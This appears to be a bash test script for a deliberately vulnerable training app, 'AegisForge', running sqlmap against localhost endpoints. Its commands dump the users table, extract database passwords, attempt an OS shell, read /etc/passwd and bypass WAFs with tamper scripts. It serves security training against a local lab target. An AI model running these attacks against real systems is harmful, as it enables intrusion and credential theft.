#!/bin/bash
# AegisForge SQLMap Testing Script
# Comprehensive SQL injection testing for all vulnerable endpoints
# Version: 2.0.0

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
RED_BASE_URL="http://localhost:5000"
OUTPUT_DIR="./sqlmap_results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="${OUTPUT_DIR}/sqlmap_${TIMESTAMP}.log"

# Create output directory
mkdir -p "${OUTPUT_DIR}"

echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║       AegisForge SQLMap Comprehensive Testing Suite        ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[INFO]${NC} Starting SQLMap tests at $(date)"
echo -e "${YELLOW}[INFO]${NC} Target: ${RED_BASE_URL}"
echo -e "${YELLOW}[INFO]${NC} Output directory: ${OUTPUT_DIR}"
echo -e "${YELLOW}[INFO]${NC} Log file: ${LOG_FILE}"
echo ""

# Function to run SQLMap test
run_sqlmap_test() {
    local test_name="$1"
    local target_url="$2"
    local params="$3"
    local description="$4"
    
    echo -e "${BLUE}[TEST]${NC} ${test_name}"
    echo -e "       ${description}"
    echo -e "       URL: ${target_url}"
    
    # Run SQLMap
    sqlmap -u "${target_url}" \
        ${params} \
        --batch \
        --output-dir="${OUTPUT_DIR}/${test_name// /_}" \
        --flush-session \
        --fresh-queries \
        >> "${LOG_FILE}" 2>&1
    
    if [ $? -eq 0 ]; then
        echo -e "       ${GREEN}✓ Test completed${NC}"
    else
        echo -e "       ${RED}✗ Test failed or no injection found${NC}"
    fi
    echo ""
}

# ========================================
# Test 1: Boolean-Based Blind SQL Injection
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Boolean-Based Blind SQL Injection Tests${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "Boolean-Based SQLi - Basic" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=5 --risk=3 --technique=B" \
    "Testing boolean-based blind SQL injection with basic parameter"

run_sqlmap_test \
    "Boolean-Based SQLi - Database Enumeration" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=3 --risk=2 --technique=B --dbs" \
    "Enumerating databases using boolean-based technique"

run_sqlmap_test \
    "Boolean-Based SQLi - Tables" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=3 --risk=2 --technique=B -D testdb --tables" \
    "Enumerating tables in target database"

run_sqlmap_test \
    "Boolean-Based SQLi - Data Extraction" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=3 --risk=2 --technique=B -D testdb -T users --dump" \
    "Extracting data from users table"

# ========================================
# Test 2: Time-Based Blind SQL Injection
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Time-Based Blind SQL Injection Tests${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "Time-Based SQLi - Detection" \
    "${RED_BASE_URL}/api/injection/sqli/time-based?id=1" \
    "--level=5 --risk=3 --technique=T --time-sec=5" \
    "Testing time-based blind SQL injection with 5 second delay"

run_sqlmap_test \
    "Time-Based SQLi - Current User" \
    "${RED_BASE_URL}/api/injection/sqli/time-based?id=1" \
    "--level=3 --risk=2 --technique=T --current-user" \
    "Extracting current database user"

run_sqlmap_test \
    "Time-Based SQLi - Current Database" \
    "${RED_BASE_URL}/api/injection/sqli/time-based?id=1" \
    "--level=3 --risk=2 --technique=T --current-db" \
    "Extracting current database name"

run_sqlmap_test \
    "Time-Based SQLi - Passwords" \
    "${RED_BASE_URL}/api/injection/sqli/time-based?id=1" \
    "--level=3 --risk=2 --technique=T --passwords" \
    "Extracting database user passwords"

# ========================================
# Test 3: UNION-Based SQL Injection
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] UNION-Based SQL Injection Tests${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "UNION SQLi - Detection" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=5 --risk=3 --technique=U" \
    "Testing UNION-based SQL injection"

run_sqlmap_test \
    "UNION SQLi - All Databases" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=3 --risk=2 --technique=U --dbs" \
    "Enumerating all databases using UNION technique"

run_sqlmap_test \
    "UNION SQLi - All Tables" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=3 --risk=2 --technique=U -D testdb --tables" \
    "Enumerating all tables using UNION technique"

run_sqlmap_test \
    "UNION SQLi - Columns" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=3 --risk=2 --technique=U -D testdb -T users --columns" \
    "Enumerating columns in users table"

run_sqlmap_test \
    "UNION SQLi - Full Dump" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=3 --risk=2 --technique=U -D testdb -T users --dump" \
    "Dumping all data from users table"

# ========================================
# Test 4: Error-Based SQL Injection
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Error-Based SQL Injection Tests${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "Error-Based SQLi - Detection" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=5 --risk=3 --technique=E" \
    "Testing error-based SQL injection"

run_sqlmap_test \
    "Error-Based SQLi - Banner" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=3 --risk=2 --technique=E --banner" \
    "Extracting database banner/version"

# ========================================
# Test 5: Stacked Queries
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Stacked Queries SQL Injection Tests${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "Stacked Queries - Detection" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=5 --risk=3 --technique=S" \
    "Testing stacked queries SQL injection"

# ========================================
# Test 6: All Techniques Combined
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] All Techniques Combined${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "All Techniques - Boolean Endpoint" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=5 --risk=3 --technique=BEUST" \
    "Testing all SQLMap techniques on boolean endpoint"

run_sqlmap_test \
    "All Techniques - Time-Based Endpoint" \
    "${RED_BASE_URL}/api/injection/sqli/time-based?id=1" \
    "--level=5 --risk=3 --technique=BEUST" \
    "Testing all SQLMap techniques on time-based endpoint"

run_sqlmap_test \
    "All Techniques - UNION Endpoint" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=5 --risk=3 --technique=BEUST" \
    "Testing all SQLMap techniques on UNION endpoint"

# ========================================
# Test 7: Advanced Features
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] Advanced SQLMap Features${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "Advanced - OS Shell" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=3 --risk=2 --technique=U --os-shell --batch --answers='action=1'" \
    "Attempting to get OS shell access (if possible)"

run_sqlmap_test \
    "Advanced - File Read" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=3 --risk=2 --technique=U --file-read=/etc/passwd" \
    "Attempting to read /etc/passwd file"

run_sqlmap_test \
    "Advanced - Privileges" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=3 --risk=2 --technique=U --privileges" \
    "Enumerating database user privileges"

run_sqlmap_test \
    "Advanced - Roles" \
    "${RED_BASE_URL}/api/injection/sqli/union?id=1" \
    "--level=3 --risk=2 --technique=U --roles" \
    "Enumerating database user roles"

# ========================================
# Test 8: POST-based SQL Injection
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] POST-based SQL Injection Tests${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "POST SQLi - Login Form" \
    "${RED_BASE_URL}/api/auth/login" \
    "--data='email=test@test.com&password=test' --level=3 --risk=2" \
    "Testing SQL injection in login form"

# ========================================
# Test 9: WAF Detection and Bypass
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[CATEGORY] WAF Detection and Bypass Tests${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""

run_sqlmap_test \
    "WAF Detection" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=3 --risk=2 --identify-waf" \
    "Detecting Web Application Firewall presence"

run_sqlmap_test \
    "WAF Bypass - Tamper Scripts" \
    "${RED_BASE_URL}/api/injection/sqli/boolean?id=1" \
    "--level=3 --risk=2 --tamper=space2comment,between,randomcase" \
    "Testing WAF bypass using tamper scripts"

# ========================================
# Summary
# ========================================
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}[SUMMARY] Test Execution Complete${NC}"
echo -e "${YELLOW}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${GREEN}[SUCCESS]${NC} All SQLMap tests completed"
echo -e "${YELLOW}[INFO]${NC} Results saved to: ${OUTPUT_DIR}"
echo -e "${YELLOW}[INFO]${NC} Full log available at: ${LOG_FILE}"
echo ""
echo -e "${BLUE}[REPORT]${NC} Generating summary report..."

# Generate summary report
{
    echo "AegisForge SQLMap Test Summary"
    echo "================================"
    echo "Timestamp: $(date)"
    echo "Target: ${RED_BASE_URL}"
    echo ""
    echo "Test Results:"
    echo "-------------"
    find "${OUTPUT_DIR}" -name "log" -type f | wc -l | xargs echo "Total tests executed:"
    echo ""
    echo "Detailed results available in: ${OUTPUT_DIR}"
    echo ""
    echo "Recommended next steps:"
    echo "1. Review all SQLMap output files in ${OUTPUT_DIR}"
    echo "2. Analyze extracted data and identified vulnerabilities"
    echo "3. Compare results with Blue Team (secure) endpoints"
    echo "4. Document findings for security training"
} > "${OUTPUT_DIR}/summary_report_${TIMESTAMP}.txt"

echo -e "${GREEN}[SUCCESS]${NC} Summary report generated: ${OUTPUT_DIR}/summary_report_${TIMESTAMP}.txt"
echo ""
echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║              SQLMap Testing Complete!                       ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
